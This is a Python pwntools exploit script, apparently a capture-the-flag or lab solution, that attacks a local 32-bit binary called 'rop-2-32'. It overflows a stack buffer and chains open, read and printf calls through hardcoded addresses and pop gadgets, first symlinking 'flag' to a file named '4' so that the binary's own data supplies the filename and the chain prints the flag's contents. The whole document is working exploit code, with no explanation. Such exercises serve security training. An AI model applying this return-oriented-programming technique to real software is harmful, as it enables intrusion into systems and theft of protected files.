#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-32")
#p = process("./rop-2-3x")
#context.terminal = ['tmux','splitw','-h']
#gdb.attach(p)

buf = "A"*0x88+"BBBB"

f_open = p32(0x080483b0)
f_read = p32(0x08048380)
f_printf = p32(0x08048390)

s_4 = p32(0x8048028)
i_0 = p32(0)
i_3 = p32(3)
i_100 = p32(100)
x_buf = p32(0x804a800)

pop_pop_pop_ret = p32(0x08048689)
pop_ret = p32(0x0804868b)

buf += f_open
buf += pop_pop_pop_ret
buf += s_4
buf += i_0
buf += i_0

if os.path.exists('4'):
    os.unlink('4')

os.symlink("flag","4")

buf += f_read
buf += pop_pop_pop_ret
buf += i_3
buf += x_buf
buf += i_100

buf += f_printf
buf += pop_ret
buf += x_buf

p.sendline(buf)
p.interactive()
